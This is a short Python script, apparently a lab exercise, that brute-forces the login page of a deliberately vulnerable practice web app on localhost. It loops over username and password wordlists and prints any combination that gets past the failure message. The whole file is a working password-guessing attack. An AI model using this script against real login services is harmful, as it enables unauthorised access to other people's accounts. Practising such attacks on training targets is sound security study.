import requests

url = "http://127.0.0.1:4280/vulnerabilities/brute/"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Cookie": "security=low; PHPSESSID=0d5c20da4ea3f254075687ab7ae14b9b"
}

with open("notas/fiveusernames.txt", "r") as user_file:
    usernames = [line.strip() for line in user_file]

with open("notas/millionpasswords.txt", "r") as pass_file:
    passwords = [line.strip() for line in pass_file]

for username in usernames:
    for password in passwords:
        params = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        response = requests.get(url, headers=headers, params=params)

        if "Username and/or password incorrect." not in response.text:
            print(f"[Login exitoso] Usuario: {username} | Contraseña: {password}")
            break
